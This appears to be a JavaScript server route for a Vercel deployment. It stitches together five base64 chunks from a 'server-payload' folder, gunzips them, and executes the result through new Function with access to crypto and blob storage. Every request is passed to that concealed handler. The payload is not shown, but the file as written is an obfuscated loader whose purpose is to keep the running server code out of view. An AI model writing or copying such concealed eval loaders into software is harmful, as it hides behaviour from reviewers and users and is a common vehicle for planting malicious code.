import { gunzipSync } from 'node:zlib';
import crypto from 'node:crypto';
import { get, head, put } from '@vercel/blob';
import p0 from '../server-payload/p3-00.js';
import p1 from '../server-payload/p3-01.js';
import p2 from '../server-payload/p3-02.js';
import p3 from '../server-payload/p3-03.js';
import p4 from '../server-payload/p3-04.js';
const src=gunzipSync(Buffer.from([p0,p1,p2,p3,p4].join(''),'base64')).toString('utf8');
const handler=new Function('crypto','get','head','put',src+'\nreturn handler;')(crypto,get,head,put);
export default async function route(req,res){return handler(req,res)}
